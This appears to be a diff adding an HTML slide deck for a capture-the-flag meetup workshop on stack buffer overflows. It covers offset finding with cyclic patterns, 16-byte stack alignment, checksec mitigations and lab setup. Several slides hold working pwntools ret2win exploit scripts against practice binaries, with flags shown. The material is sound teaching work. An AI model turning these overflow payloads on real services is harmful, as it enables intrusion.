+          <div id="patternResult" style="padding: 10px; background: var(--bg-card-alt); border-radius: 6px; font-family: monospace; font-size: 0.88rem; color: var(--htb-green);">
+            Select a crash pattern above to test...
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 style="color: var(--cyber-blue); font-size: 1rem; margin-bottom: 8px;">Terminal Commands</h3>
+          <pre class="code-block"><span class="highlight-muted"># In GDB / pwndbg:</span>
+pwndbg&gt; cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaa...
+
+pwndbg&gt; run
+[SIGSEGV crash occurred]
+
+<span class="highlight-green">pwndbg&gt; cyclic -l &lt;crash_value&gt;</span>
+Found at offset [exact number]!</pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 8: Hands-On Lab: x86 Challenge Diagram -->
+    <section class="slide" data-title="Hands-on x86 Challenge">
+      <h1 class="slide-title">Hands-On Practice: <span class="accent">x86 (32-bit)</span></h1>
+      <h2 class="slide-subtitle">Walkthrough from writeup: `handson/x86/challenge`</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Visual Offset Breakdown (76 Bytes)</h3>
+          <div class="stack-frame-box" style="margin-bottom: 12px;">
+            <div class="frame-cell ret-addr">
+              <span>Return Address: win()</span>
+              <span>0x080491a6 (Target Address)</span>
+            </div>
+            <div class="frame-cell saved-rbp">
+              <span>Saved EBP + EBX alignment</span>
+              <span>4B EBP + 4B EBX = 8 Bytes</span>
+            </div>
+            <div class="frame-cell buffer">
+              <span>char buffer[64]</span>
+              <span>64 Bytes</span>
+            </div>
+          </div>
+          <p style="font-size: 0.88rem; color: var(--text-muted);">
+            Total Offset Calculation: <code class="inline">64 + 4 + 4 = 76 bytes</code>!
+          </p>
+        </div>
+
+        <div class="card">
+          <div class="tab-nav">
+            <button class="tab-btn active" onclick="switchTab(this, 'h86-code')">Python Exploit</button>
+            <button class="tab-btn" onclick="switchTab(this, 'h86-out')">Terminal Output</button>
+          </div>
+
+          <div class="tab-content active" id="h86-code">
+            <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
+
+elf = ELF(<span class="highlight-green">'./challenge'</span>)
+offset = <span class="highlight-green">76</span>
+win_addr = elf.symbols[<span class="highlight-green">'win'</span>]  <span class="highlight-muted"># 0x080491a6</span>
+
+payload = <span class="highlight-purple">b'A'</span> * offset + pack(win_addr)
+
+p = process(<span class="highlight-green">'./challenge'</span>)
+p.sendlineafter(<span class="highlight-purple">b'input: '</span>, payload)
+p.interactive()</pre>
+          </div>
+
+          <div class="tab-content" id="h86-out">
+            <pre class="code-block" style="color: #6ee7b7;">
+$ python3 solve.py
+[+] Starting local process './challenge'
+You entered: AAAAAAAAAAAAAAAAA...
+
+🎉 Congratulations! You solved the x86 hands-on!
+FLAG{x86_r3t2w1n_b4s1cs}</pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 9: Hands-On Lab: x64 Challenge & 16-Byte Stack Alignment Trap -->
+    <section class="slide" data-title="Hands-on x64 & Stack Alignment">
+      <h1 class="slide-title">Hands-On Practice: <span class="accent">x64 &amp; The Stack Trap</span></h1>
+      <h2 class="slide-subtitle">Why jumping directly to win() crashes on 64-bit systems</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <h3 style="color: var(--danger-red); font-size: 1rem; margin-bottom: 8px;">The 16-Byte Stack Alignment Trap</h3>
+          <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 10px;">
+            The System V AMD64 ABI mandates that <code class="inline">RSP</code> must be a multiple of 16 (<code class="inline">RSP % 16 == 0</code>) before executing any <code class="inline">call</code> instruction. GLIBC uses SSE <code class="inline">movaps</code> instructions that <strong>instantly crash</strong> if unaligned!
+          </p>
+
+          <div class="alignment-visual">
+            <div class="align-row bad">
+              <span>Without ret gadget: RSP ends with 0x...8</span>
+              <span>❌ CRASH (SIGSEGV)</span>
+            </div>
+            <div class="align-row good">
+              <span>With ret gadget: Pops 8B, RSP ends with 0x...0</span>
+              <span>✅ 16-byte Aligned!</span>
+            </div>
+          </div>
+
+          <div style="padding: 10px; background: rgba(159, 239, 0, 0.08); border-left: 4px solid var(--htb-green); border-radius: 4px; font-size: 0.85rem;">
+            <strong>The Fix:</strong> Prepend a single <code class="inline">ret</code> instruction before the <code class="inline">win()</code> address!
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Complete x64 Exploit (<code class="inline">solve.py</code>)</h3>
+          <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
+
+elf = ELF(<span class="highlight-green">'./challenge'</span>)
+offset = <span class="highlight-green">72</span>  <span class="highlight-muted"># 64B buffer + 8B Saved RBP</span>
+
+ret_gadget = ROP(elf).find_gadget([<span class="highlight-green">'ret'</span>])[<span class="highlight-green">0</span>]
+win_addr = elf.symbols[<span class="highlight-green">'win'</span>]
+
+payload = <span class="highlight-purple">b'A'</span> * offset
+payload += p64(ret_gadget)  <span class="highlight-green"># Fixes 16-byte alignment!</span>
+payload += p64(win_addr)
+
+p = process(<span class="highlight-green">'./challenge'</span>)
+p.sendlineafter(<span class="highlight-purple">b'input: '</span>, payload)
+p.interactive()
+<span class="highlight-green"># Output: FLAG{x64_r3t2w1n_b4s1cs}</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 10: Comparison Master Matrix -->
+    <section class="slide" data-title="Summary: x86 vs x64">
+      <h1 class="slide-title">Comparison Matrix: <span class="accent">x86 vs x64</span></h1>
+      <h2 class="slide-subtitle">Visual differences summarized directly from the writeup</h2>
+
+      <div class="card" style="padding: 20px;">
+        <table style="width: 100%; border-collapse: collapse; font-size: 0.9rem;">
+          <thead>
+            <tr style="background: #111e33; border-bottom: 2px solid var(--border-subtle); text-align: left;">
+              <th style="padding: 10px; color: #fff;">Feature</th>
+              <th style="padding: 10px; color: #60a5fa;">x86 (32-bit)</th>
+              <th style="padding: 10px; color: var(--htb-green);">x64 (64-bit)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 10px; font-weight: bold;">Hands-on Offset</td>
+              <td style="padding: 10px; font-family: monospace;">76 bytes (64B + 4B EBX + 4B EBP)</td>
+              <td style="padding: 10px; font-family: monospace;">72 bytes (64B + 8B RBP)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 10px; font-weight: bold;">Register in GDB</td>
+              <td style="padding: 10px;"><code class="inline">EIP</code> shows corrupted addr directly</td>
+              <td style="padding: 10px;"><code class="inline">RSP</code> top of stack holds corrupted ret addr</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 10px; font-weight: bold;">Pointer Size</td>
+              <td style="padding: 10px;">4 bytes (<code class="inline">p32()</code>)</td>
+              <td style="padding: 10px;">8 bytes (<code class="inline">p64()</code>)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 10px; font-weight: bold;">Calling Convention</td>
+              <td style="padding: 10px;">All arguments pushed to stack</td>
+              <td style="padding: 10px;">Registers: <code class="inline">RDI, RSI, RDX, RCX, R8, R9</code></td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 10px; font-weight: bold;">16-byte Stack Alignment</td>
+              <td style="padding: 10px; color: var(--htb-green);">Not required</td>
+              <td style="padding: 10px; color: var(--danger-red);">Strictly enforced (<code class="inline">movaps</code>)</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; font-weight: bold;">Extra Gadget Needed</td>
+              <td style="padding: 10px; color: var(--htb-green);">No gadget needed</td>
+              <td style="padding: 10px; color: var(--warning-orange);">Yes (<code class="inline">ret</code> gadget required)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Slide 11: Mini-CTF: x86 Challenge Diagram -->
+    <section class="slide" data-title="Mini-CTF x86 Binary">
+      <h1 class="slide-title">Mini-CTF: <span class="accent">x86 Binary</span></h1>
+      <h2 class="slide-subtitle">Walkthrough from writeup: `mini-ctf/x86` (`challenge_x86`)</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Recon &amp; Offset Math</h3>
+          <div class="diagram-flow" style="flex-direction: column; gap: 8px; margin: 8px 0;">
+            <div class="diagram-node" style="width: 100%; text-align: left; padding: 8px 12px;">
+              <strong>Menu Prompt:</strong> Enter 1 ➔ Navigates to vulnerable function
+            </div>
+            <div class="diagram-node" style="width: 100%; text-align: left; padding: 8px 12px;">
+              <strong>Target Function:</strong> <code class="inline">get_flag()</code> at <code class="inline">0x08049216</code>
+            </div>
+            <div class="diagram-node active-node" style="width: 100%; text-align: left; padding: 8px 12px;">
+              <strong>Assembly Calculation:</strong> <code class="inline">sub esp, 0x24</code> (36B buffer) + 4B EBX + 4B EBP = <strong>44 Bytes</strong>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 style="color: var(--cyber-blue); font-size: 1rem; margin-bottom: 8px;">Exploit &amp; Flag</h3>
+          <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
+
+elf = ELF(<span class="highlight-green">'./challenge_x86'</span>)
+offset = <span class="highlight-green">44</span>
+flag_addr = elf.symbols[<span class="highlight-green">'get_flag'</span>]
+
+payload = <span class="highlight-purple">b'A'</span> * offset + pack(flag_addr)
+
+p = remote(<span class="highlight-green">'127.0.0.1'</span>, <span class="highlight-green">9001</span>)  <span class="highlight-muted"># or local process</span>
+p.sendlineafter(<span class="highlight-purple">b'&gt;'</span>, <span class="highlight-purple">b'1'</span>)
+p.sendlineafter(<span class="highlight-purple">b'name? '</span>, payload)
+p.interactive()</pre>
+          <div style="margin-top: 10px; padding: 8px; background: rgba(159, 239, 0, 0.1); border: 1px solid var(--htb-green); border-radius: 4px; font-size: 0.85rem;">
+            🚩 <strong>Flag:</strong> <code class="inline" style="color:#fff;">HTB{x86_buff3r_0v3rfl0w_m4st3r}</code>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 12: Mini-CTF: x64 Challenge Diagram -->
+    <section class="slide" data-title="Mini-CTF x64 Binary">
+      <h1 class="slide-title">Mini-CTF: <span class="accent">x64 Binary</span></h1>
+      <h2 class="slide-subtitle">Walkthrough from writeup: `mini-ctf/x64` (`challenge_x64`)</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Recon &amp; Gadget Extraction</h3>
+          <div class="diagram-flow" style="flex-direction: column; gap: 8px; margin: 8px 0;">
+            <div class="diagram-node" style="width: 100%; text-align: left; padding: 8px 12px;">
+              <strong>Safe Menu Input:</strong> <code class="inline">scanf("%d")</code> only reads 4 bytes.
+            </div>
+            <div class="diagram-node" style="width: 100%; text-align: left; padding: 8px 12px;">
+              <strong>Offset via cyclic:</strong> Crash on <code class="inline">faaaaaaa</code> ➔ Offset = <strong>40 Bytes</strong>.
+            </div>
+            <div class="diagram-node active-node" style="width: 100%; text-align: left; padding: 8px 12px;">
+              <strong>ret Gadget Search:</strong> <code class="inline">rop --grep "ret"</code> ➔ <code class="inline">0x40101a</code>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 style="color: var(--cyber-blue); font-size: 1rem; margin-bottom: 8px;">Exploit &amp; Flag</h3>
+          <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
+
+elf = ELF(<span class="highlight-green">'./challenge_x64'</span>)
+offset = <span class="highlight-green">40</span>
+ret_gadget = <span class="highlight-green">0x40101a</span>
+flag_addr = elf.symbols[<span class="highlight-green">'get_flag'</span>]  <span class="highlight-muted"># 0x401276</span>
+
+payload = <span class="highlight-purple">b'A'</span> * offset + pack(ret_gadget) + pack(flag_addr)
+
+p = remote(<span class="highlight-green">'127.0.0.1'</span>, <span class="highlight-green">9002</span>)
+p.sendlineafter(<span class="highlight-purple">b'&gt;'</span>, <span class="highlight-purple">b'1'</span>)
+p.sendlineafter(<span class="highlight-purple">b'name? '</span>, payload)
+p.interactive()</pre>
+          <div style="margin-top: 10px; padding: 8px; background: rgba(159, 239, 0, 0.1); border: 1px solid var(--htb-green); border-radius: 4px; font-size: 0.85rem;">
+            🚩 <strong>Flag:</strong> <code class="inline" style="color:#fff;">HTB{x64_st4ck_sm4sh1ng_pr0}</code>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 13: Security Mitigations Matrix Diagram -->
+    <section class="slide" data-title="Security Mitigations (checksec)">
+      <h1 class="slide-title">Binary Protections: <span class="accent">checksec</span></h1>
+      <h2 class="slide-subtitle">Interactive shield matrix of defensive mitigations</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 10px;">checksec Analysis</h3>
+          <pre class="code-block">$ checksec --file=challenge_x64
+RELRO:    <span class="highlight-blue">Partial RELRO</span>
+Stack:    <span class="highlight-red">No canary found</span>
+NX:       <span class="highlight-green">NX enabled</span>
+PIE:      <span class="highlight-red">No PIE (0x400000)</span></pre>
+          <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 10px;">
+            Because <strong>Canary</strong> and <strong>PIE</strong> are disabled, our ret2win exploits work with static addresses and without leaking memory!
+          </p>
+        </div>
+
+        <div class="card">
+          <h3 style="color: var(--cyber-blue); font-size: 1rem; margin-bottom: 10px;">Defense Matrix</h3>
+          <div style="display: flex; flex-direction: column; gap: 8px; font-size: 0.85rem;">
+            <div style="padding: 8px 12px; background: var(--bg-card-alt); border-radius: 6px;">
+              <strong>🛡️ NX / DEP:</strong> Stack non-executable. Blocks shellcode, but permits ret2win &amp; ROP.
+            </div>
+            <div style="padding: 8px 12px; background: var(--bg-card-alt); border-radius: 6px;">
+              <strong>🛡️ Canary:</strong> Secret cookie before Saved RBP. If modified, aborts execution before <code class="inline">ret</code>.
+            </div>
+            <div style="padding: 8px 12px; background: var(--bg-card-alt); border-radius: 6px;">
+              <strong>🛡️ PIE:</strong> Randomizes binary base address every run.
+            </div>
+            <div style="padding: 8px 12px; background: var(--bg-card-alt); border-radius: 6px;">
+              <strong>🛡️ ASLR:</strong> Randomizes stack, heap, and libc shared library locations.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 14: Apple Silicon Split Architecture Diagram -->
+    <section class="slide" data-title="Apple Silicon & Colima Setup">
+      <h1 class="slide-title">Apple Silicon Setup: <span class="accent">Colima &amp; Ghidra</span></h1>
+      <h2 class="slide-subtitle">Split Architecture: Native macOS GUI + Lightweight Headless Linux VM</h2>
+
+      <div class="diagram-flow">
+        <div class="diagram-node" style="flex: 1.2;">
+          <div style="font-size: 1.4rem;">🍎</div>
+          <strong style="color: #60a5fa;">macOS Host</strong>
+          <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">
+            Native Ghidra GUI (Zero lag)<br>
+            Terminal &amp; Code Editors
+          </div>
+        </div>
+        <div class="diagram-arrow">⇄ Shared Filesystem (/Users/...) ⇄</div>
+        <div class="diagram-node active-node" style="flex: 1.2;">
+          <div style="font-size: 1.4rem;">🐧</div>
+          <strong style="color: var(--htb-green);">Colima (QEMU x86_64)</strong>
+          <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">
+            Headless Linux (~2GB RAM)<br>
+            GDB + pwndbg, gcc-multilib, Docker
+          </div>
+        </div>
+      </div>
+
+      <div class="card" style="margin-top: 14px;">
+        <h3 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Attendee Commands</h3>
+        <pre class="code-block">
+<span class="highlight-muted"># 1. Start Colima in x86_64 mode</span>
+colima start --arch x86_64 --vm-type qemu
+
+<span class="highlight-muted"># 2. Enter Linux shell</span>
+colima ssh
+
+<span class="highlight-muted"># 3. Inside Colima: run tools installer</span>
+cd /Users/&lt;username&gt;/.../htb-meetup-pwn
+./scripts/install-tools.sh --skip-ghidra</pre>
+      </div>
+    </section>
+
+    <!-- Slide 15: Conclusion & Q&A -->
+    <section class="slide" data-title="Conclusion & Resources">
+      <div style="max-width: 900px; text-align: center; margin: 0 auto;">
+        <span class="brand-badge" style="font-size: 0.9rem; padding: 4px 12px; margin-bottom: 14px; display: inline-block;">SESSION COMPLETE</span>
+        <h1 class="slide-title">Happy <span class="accent">Hacking</span>! 🚩</h1>
+        <h2 class="slide-subtitle">Questions, Comments, &amp; Discussion</h2>
+
+        <div class="grid-3" style="margin-top: 28px; text-align: left;">
+          <div class="card">
+            <h4 style="color: var(--htb-green); font-size: 1rem; margin-bottom: 8px;">Key Takeaway</h4>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">
+              PWN is about precision: finding memory bounds errors and turning CPU execution flow toward your desired objective.
+            </p>
+          </div>
+
+          <div class="card">
+            <h4 style="color: var(--cyber-blue); font-size: 1rem; margin-bottom: 8px;">Detailed Writeup</h4>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">
+              Full solutions and assembly analysis:<br>
+              <a href="https://ctf.danplace.tech/posts/htb-meetup-iium/" target="_blank" style="color: var(--htb-green); font-weight: bold; text-decoration: none;">ctf.danplace.tech</a>
+            </p>
+          </div>
+
+          <div class="card">
+            <h4 style="color: var(--cyber-purple); font-size: 1rem; margin-bottom: 8px;">Speaker &amp; Slides</h4>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">
+              Danish Hakim (<a href="https://github.com/danishhakim" target="_blank" style="color: #fff;">@danishhakim</a>)<br>
+              Domain: <a href="https://slides.danplace.tech" target="_blank" style="color: var(--cyber-blue);">slides.danplace.tech</a>
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Keybinds Bar -->
+  <footer class="bottom-bar">
+    <div class="keybinds">
+      <span><kbd>→</kbd> / <kbd>Space</kbd> Next</span>
+      <span><kbd>←</kbd> Prev</span>
+      <span><kbd>O</kbd> Overview</span>
+      <span><kbd>F</kbd> Fullscreen</span>
+    </div>
+    <div>
+      <span>HTB Meetup IIUM • slides.danplace.tech</span>
+    </div>
+  </footer>
+
+  <!-- Overview Modal -->
+  <div class="overview-modal" id="overviewModal">
+    <div style="display: flex; justify-content: space-between; align-items: center;">
+      <h2 style="font-size: 1.4rem; color: #fff;">Slide Overview</h2>
+      <button class="btn btn-primary" id="btnCloseOverview">Close (Esc)</button>
+    </div>
+    <div class="overview-grid" id="overviewGrid"></div>
+  </div>
+</div>
+
+<script>
+  // Slide Navigation
+  const slides = Array.from(document.querySelectorAll('.slide'));
+  let currentSlideIndex = 0;
+
+  const slideIndicator = document.getElementById('slideIndicator');
+  const progressBar = document.getElementById('progressBar');
+  const btnPrev = document.getElementById('btnPrev');
+  const btnNext = document.getElementById('btnNext');
+  const btnOverview = document.getElementById('btnOverview');
+  const btnFullscreen = document.getElementById('btnFullscreen');
+  const overviewModal = document.getElementById('overviewModal');
+  const overviewGrid = document.getElementById('overviewGrid');
+  const btnCloseOverview = document.getElementById('btnCloseOverview');
+
+  function updateSlide(index) {
+    if (index < 0 || index >= slides.length) return;
+    slides[currentSlideIndex].classList.remove('active');
+    currentSlideIndex = index;
+    slides[currentSlideIndex].classList.add('active');
+
+    slideIndicator.textContent = `Slide ${currentSlideIndex + 1} / ${slides.length}`;
+    const percent = ((currentSlideIndex + 1) / slides.length) * 100;
+    progressBar.style.width = `${percent}%`;
+
+    window.location.hash = `#slide-${currentSlideIndex + 1}`;
+  }
+
+  function nextSlide() { if (currentSlideIndex < slides.length - 1) updateSlide(currentSlideIndex + 1); }
+  function prevSlide() { if (currentSlideIndex > 0) updateSlide(currentSlideIndex - 1); }
+
+  window.addEventListener('keydown', (e) => {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+      if (e.key === 'Escape') e.target.blur();
+      return;
+    }
+    if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'PageDown') {
+      e.preventDefault();
+      nextSlide();
+    } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+      e.preventDefault();
+      prevSlide();
+    } else if (e.key === 'o' || e.key === 'O') {
+      toggleOverview();
+    } else if (e.key === 'f' || e.key === 'F') {
+      toggleFullscreen();
+    } else if (e.key === 'Escape') {
+      overviewModal.classList.remove('open');
+    }
+  });
+
+  btnPrev.addEventListener('click', prevSlide);
+  btnNext.addEventListener('click', nextSlide);
+
+  function toggleFullscreen() {
+    if (!document.fullscreenElement) {
+      document.documentElement.requestFullscreen().catch(() => {});
+    } else {
+      document.exitFullscreen().catch(() => {});
+    }
+  }
+  btnFullscreen.addEventListener('click', toggleFullscreen);
+
+  function buildOverviewGrid() {
+    overviewGrid.innerHTML = '';
+    slides.forEach((slide, idx) => {
+      const title = slide.getAttribute('data-title') || `Slide ${idx + 1}`;
+      const thumb = document.createElement('div');
+      thumb.className = `slide-thumb ${idx === currentSlideIndex ? 'current' : ''}`;
+      thumb.innerHTML = `
+        <span style="color: var(--htb-green); font-size: 0.72rem; font-weight: bold;">Slide ${idx + 1}</span>
+        <span style="color: #fff; font-size: 0.9rem; font-weight: 600;">${title}</span>
+      `;
+      thumb.addEventListener('click', () => {
+        updateSlide(idx);
+        overviewModal.classList.remove('open');
+      });
+      overviewGrid.appendChild(thumb);
+    });
+  }
+
+  function toggleOverview() {
+    buildOverviewGrid();
+    overviewModal.classList.toggle('open');
+  }
+
+  btnOverview.addEventListener('click', toggleOverview);
+  btnCloseOverview.addEventListener('click', () => overviewModal.classList.remove('open'));
+
+  if (window.location.hash) {
+    const match = window.location.hash.match(/#slide-(\d+)/);
+    if (match) {
+      const target = parseInt(match[1], 10) - 1;
+      if (target >= 0 && target < slides.length) updateSlide(target);
+    }
+  } else {
+    updateSlide(0);
+  }
+
+  function switchTab(btn, contentId) {
+    const parent = btn.closest('.card');
+    parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    parent.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    btn.classList.add('active');
+    const target = parent.querySelector(`#${contentId}`);
+    if (target) target.classList.add('active');
+  }
+
+  // --- MEMORY MAP DATA ---
+  const memoryInfo = {
+    stack: {
+      title: "The Stack",
+      perms: "RW- (Read / Write)",
+      permColor: "#a855f7",
+      desc: "Grows downward from high to low memory. Holds local function buffers, arguments, and return addresses (RIP/EIP).",
+      sec: "Target of Stack Buffer Overflows! Excessive input overflows past the buffer and overwrites the Return Address, granting total control of the CPU's instruction pointer."
+    },
+    heap: {
+      title: "The Heap",
+      perms: "RW- (Read / Write)",
+      permColor: "#10b981",
+      desc: "Grows upward from low to high memory. Managed manually via malloc(), calloc(), and free().",
+      sec: "Target of Heap Exploitation (Use-After-Free, Double Free, Tcache poisoning)."
+    },
+    bss: {
+      title: "BSS Segment",
+      perms: "RW- (Read / Write)",
+      permColor: "#eab308",
+      desc: "Contains uninitialized global and static variables. Zeroed out at launch.",
+      sec: "Often used as a stable memory buffer in exploits to store counterfeit strings or shellcode."
+    },
+    data: {
+      title: "Data Segment",
+      perms: "RW- (Read / Write)",
+      permColor: "#3b82f6",
+      desc: "Holds global and static variables explicitly initialized in source code.",
+      sec: "Global pointers or state variables stored here can be targeted."
+    },
+    text: {
+      title: "Text / Code Segment",
+      perms: "R-X (Read & Execute)",
+      permColor: "#ef4444",
+      desc: "Contains the raw compiled assembly instructions of the program.",
+      sec: "In ret2win and ROP exploits, we redirect execution to target functions (win, get_flag) or gadgets here!"
+    }
+  };
+
+  const ladderChunks = document.querySelectorAll('.mem-chunk[data-seg]');
+  ladderChunks.forEach(chunk => {
+    chunk.addEventListener('click', () => {
+      ladderChunks.forEach(c => c.classList.remove('selected'));
+      chunk.classList.add('selected');
+      const data = memoryInfo[chunk.getAttribute('data-seg')];
+      if (data) {
+        document.getElementById('inspectTitle').textContent = data.title;
+        document.getElementById('inspectPerms').textContent = data.perms;
+        document.getElementById('inspectPerms').style.background = data.permColor;
+        document.getElementById('inspectDesc').textContent = data.desc;
+        document.getElementById('inspectSec').textContent = data.sec;
+      }
+    });
+  });
+
+  // --- LIVE SLIDER SIMULATOR ---
+  function onSimRangeChange(val) {
+    const len = parseInt(val, 10);
+    document.getElementById('simRangeVal').textContent = `${len} Bytes`;
+
+    const rowBuf = document.getElementById('simRowBuf');
+    const rowRbp = document.getElementById('simRowRbp');
+    const rowRip = document.getElementById('simRowRip');
+    const bufText = document.getElementById('simBufText');
+    const rbpText = document.getElementById('simRbpText');
+    const ripText = document.getElementById('simRipText');
+    const hud = document.getElementById('simHud');
+    const hudStatus = document.getElementById('simHudStatus');
+    const hudRip = document.getElementById('simHudRip');
+
+    // Buffer [0..63]
+    if (len <= 64) {
+      bufText.textContent = `${'A'.repeat(Math.min(len, 32))}${len > 32 ? '...' : ''} (${len}/64 bytes filled)`;
+      rowBuf.classList.remove('corrupted-cell');
+    } else {
+      bufText.textContent = `${'A'.repeat(32)}... (64/64 FULL + ${len - 64}B OVERFLOW)`;
+      rowBuf.classList.add('corrupted-cell');
+    }
+
+    // RBP [64..71]
+    if (len <= 64) {
+      rbpText.textContent = "0x7fffffffe860 (Valid Caller RBP)";
+      rowRbp.classList.remove('corrupted-cell');
+    } else if (len <= 72) {
+      const ov = len - 64;
+      rbpText.textContent = `Clobbered (${ov}/8 bytes overwritten with 'A')`;
+      rowRbp.classList.add('corrupted-cell');
+    } else {
+      rbpText.textContent = "0x4141414141414141 (COMPLETELY CLOBBERED!)";
+      rowRbp.classList.add('corrupted-cell');
+    }
+
+    // RIP [72..79]
+    if (len <= 72) {
+      ripText.textContent = "0x0000000000401290 (<main+80>)";
+      rowRip.classList.remove('corrupted-cell', 'pwned-cell');
+      hud.style.background = "rgba(59, 130, 246, 0.15)";
+      hud.style.borderColor = "#3b82f6";
+      hud.style.color = "#60a5fa";
+      hudStatus.textContent = "🟢 Normal Execution: Function returns safely to caller.";
+      hudRip.textContent = "RIP = 0x401290";
+    } else {
+      const ov = len - 72;
+      ripText.textContent = `0x4141414141414141 (${ov}/8 bytes overwritten!)`;
+      rowRip.classList.remove('pwned-cell');
+      rowRip.classList.add('corrupted-cell');
+      hud.style.background = "rgba(255, 51, 102, 0.2)";
+      hud.style.borderColor = "var(--danger-red)";
+      hud.style.color = "#fca5a5";
+      hudStatus.textContent = "💥 CRASH! Return Address corrupted. Segmentation Fault (SIGSEGV)!";
+      hudRip.textContent = "RIP = 0x41414141";
+    }
+  }
+
+  function setSlider(val, isWin = false) {
+    document.getElementById('simRange').value = val;
+    onSimRangeChange(val);
+
+    if (isWin) {
+      const rowRip = document.getElementById('simRowRip');
+      const ripText = document.getElementById('simRipText');
+      const hud = document.getElementById('simHud');
+      const hudStatus = document.getElementById('simHudStatus');
+      const hudRip = document.getElementById('simHudRip');
+
+      rowRip.classList.remove('corrupted-cell');
+      rowRip.classList.add('pwned-cell');
+      ripText.textContent = "0x00000000004011b6 (<win>) [HIJACKED!]";
+      hud.style.background = "rgba(159, 239, 0, 0.2)";
+      hud.style.borderColor = "var(--htb-green)";
+      hud.style.color = "var(--htb-green)";
+      hudStatus.textContent = "🎉 PWNED! Hijacked RIP to win()! FLAG{x64_r3t2w1n_b4s1cs}";
+      hudRip.textContent = "RIP = 0x4011b6 (win)";
+    }
+  }
+
+  // --- CYCLIC PATTERN TESTER ---
+  function testPattern(pattern, offset, label) {
+    const res = document.getElementById('patternResult');
+    res.innerHTML = `
+      <strong>Pattern '${pattern}':</strong><br>
+      • Target: <span style="color:#fff;">${label}</span><br>
+      • Calculated Offset: <span style="color:var(--htb-green); font-size:1.1rem; font-weight:bold;">${offset} Bytes</span><br>
+      • Payload formula: <code>b'A' * ${offset} + target_addr</code>
+    `;
+  }
+</script>
+</body>
+</html>
